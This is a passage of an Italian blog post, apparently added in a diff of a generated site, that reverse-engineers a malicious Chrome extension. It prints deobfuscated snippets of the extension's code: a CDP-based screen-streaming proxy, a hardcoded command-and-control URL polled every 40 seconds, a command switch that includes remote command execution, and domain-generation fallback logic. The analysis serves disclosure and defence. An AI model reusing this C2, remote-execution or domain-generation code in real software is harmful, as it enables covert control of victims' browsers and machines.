+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">serverInstance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nx">serverInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CDPServerProxy</span><span class="p">(</span><span class="nx">_0x442279</span><span class="p">,</span> <span class="nx">_0x57e288</span><span class="p">,</span> <span class="nx">_0x166eae</span><span class="p">,</span> <span class="nx">_0x209f9e</span><span class="p">,</span> <span class="nx">_0x35ef1b</span><span class="p">,</span> <span class="nx">_0x1cf597</span><span class="p">,</span> <span class="nx">_0x558178</span><span class="p">,</span> <span class="nx">_0x3e622e</span><span class="p">,</span> <span class="nx">_0xd3c5bf</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nx">_0x517146</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">serverInstance</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="k">return</span> <span class="nx">_0x517146</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Il malware pilota una scheda del browser tramite il Chrome DevTools Protocol e le ordina di produrre uno stream dello schermo. Che roba!</p>
+<h2 id="da-chi-prende-gli-ordini">Da chi prende gli ordini?</h2>
+<p>A questo punto la domanda naturale è: chi comanda tutto questo? Chi è sto olive? Guardando sempre nel file <code>background.js</code> possiamo ricostruire tutta la catena C2 dell&rsquo;estensione. Gli ordini arrivano da un server esterno, il command &amp; control (C2), il cui indirizzo è scritto in chiaro nel codice (deoffuscato):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="kr">const</span> <span class="nx">BASE_GATE</span> <span class="o">=</span> <span class="s2">&#34;https://olive3451.com&#34;</span><span class="p">;</span> <span class="c1">// il bastardo
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">POLL_INTERVAL</span> <span class="o">=</span> <span class="mi">40000</span><span class="p">;</span> <span class="c1">// interroga il server ogni 40 secondi
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">SEEDS</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2320261888</span><span class="p">,</span> <span class="mi">674570642</span><span class="p">,</span> <span class="mi">4223083751</span><span class="p">];</span>
+</span></span></code></pre></div><p>Il malware non aspetta passivamente ma a intervalli regolari di circa 40 secondi fa un fetch della configurazione aggiornata:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">pollWorkspace</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="kr">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getUuid</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="kr">await</span> <span class="nx">getWorkUrl</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="kr">const</span> <span class="nx">res</span>  <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">BASE_URL</span> <span class="o">+</span> <span class="s2">&#34;/gate/workspace/&#34;</span> <span class="o">+</span> <span class="nx">uuid</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="c1">// ...
+</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>A questo punto è possibile individuare chiaramente i comandi che può ricevere dall&rsquo;esterno:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="k">case</span> <span class="s2">&#34;start_proxy&#34;</span><span class="o">:</span>  <span class="nx">initializeProxy</span><span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">ip</span><span class="p">,</span> <span class="nx">cmd</span><span class="p">.</span><span class="nx">port</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>   
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="k">case</span> <span class="s2">&#34;start_cdp&#34;</span><span class="o">:</span>    <span class="kr">await</span> <span class="nx">startServer</span><span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">ip</span><span class="p">,</span> <span class="nx">cmd</span><span class="p">.</span><span class="nx">port</span><span class="p">,</span> <span class="p">...);</span> <span class="k">break</span><span class="p">;</span> 
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="k">case</span> <span class="s2">&#34;open_url&#34;</span><span class="o">:</span>     <span class="kr">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span> <span class="nx">url</span><span class="o">:</span> <span class="nx">cmd</span><span class="p">.</span><span class="nx">url</span> <span class="p">});</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="k">case</span> <span class="s2">&#34;execute_cmd&#34;</span><span class="o">:</span>  <span class="kr">await</span> <span class="nx">psCall</span><span class="p">(</span><span class="s2">&#34;/run&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">command</span><span class="o">:</span> <span class="nx">cmd</span><span class="p">.</span><span class="nx">code</span> <span class="p">});</span> <span class="k">break</span><span class="p">;</span> 
+</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="k">case</span> <span class="s2">&#34;uninstall&#34;</span><span class="o">:</span>    <span class="nx">chrome</span><span class="p">.</span><span class="nx">management</span><span class="p">.</span><span class="nx">uninstallSelf</span><span class="p">();</span> <span class="k">break</span><span class="p">;</span>    
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Nota d&rsquo;onore all&rsquo;attaccante per la logica con cui riesce a continuare la comunicazione anche se il dominio principale venisse bloccato, in particolare la funzione <code>getWorkUrl()</code> si occupa di generare nuovi domini da utilizzare:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">getWorkUrl</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="kd">let</span> <span class="nx">domain</span> <span class="o">=</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;cf-domain&#34;</span><span class="p">))[</span><span class="s2">&#34;cf-domain&#34;</span><span class="p">]</span> <span class="o">||</span> <span class="nx">BASE_GATE</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">// 1) prova il server noto
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="kr">const</span> <span class="nx">r</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">domain</span> <span class="o">+</span> <span class="s2">&#34;/gate/ping&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">ok</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">ping</span> <span class="o">===</span> <span class="s2">&#34;pong&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">BASE_URL</span> <span class="o">=</span> <span class="nx">domain</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">// 2) se è morto, genera domini nuovi per la settimana corrente e li prova
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">BASE_URL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="kr">const</span> <span class="nx">candidates</span> <span class="o">=</span> <span class="nx">DomainGenerator</span><span class="p">.</span><span class="nx">generateForCurrentWeek</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="nx">SEEDS</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">d</span> <span class="k">of</span> <span class="nx">candidates</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="kr">const</span> <span class="nx">r</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span> <span class="o">+</span> <span class="nx">d</span> <span class="o">+</span> <span class="s2">&#34;/gate/ping&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">ok</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">ping</span> <span class="o">===</span> <span class="s2">&#34;pong&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">          <span class="nx">BASE_URL</span> <span class="o">=</span> <span class="s2">&#34;https://&#34;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">          <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">set</span><span class="p">({</span> <span class="s2">&#34;cf-domain&#34;</span><span class="o">:</span> <span class="nx">BASE_URL</span> <span class="p">});</span>  <span class="c1">// memorizza il nuovo server
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span>          <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Da qui l&rsquo;utilizzo di SEEDS hardcoded nell&rsquo;inizializzazione.</p>
+<h2 id="conclusioni">Conclusioni</h2>
+<p>Sono certo che scavando più a fondo, si riesca a trovare altre schifezze che fa quest&rsquo;estensione. Per il momento credo sia il caso di eliminarla dal pc. È stato comunque un esperimento formativo: vedere dall&rsquo;interno come funziona un&rsquo;estensione del genere e quanto può essere pericolosa.</p>
+
+</content>
+
+
+<ul class="tags">
+  
+  <li><a href="http://localhost:1313/blog/reverse-engineering/">#Reverse Engineering</a></li>
+  
+</ul>
+
+
+  </main>
+  <footer><span>© 2026 Alessio Maddaluno</span>
+<span class="links">
+  <a href="https://github.com/alessiomaddaluno">GitHub</a>
+  <a href="mailto:alessio.maddaluno@gmail.com">Email</a>
+  <a href="/blog/index.xml">RSS</a>
+  <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</span>
+</footer>
+
+  
+</body>
+
+</html>
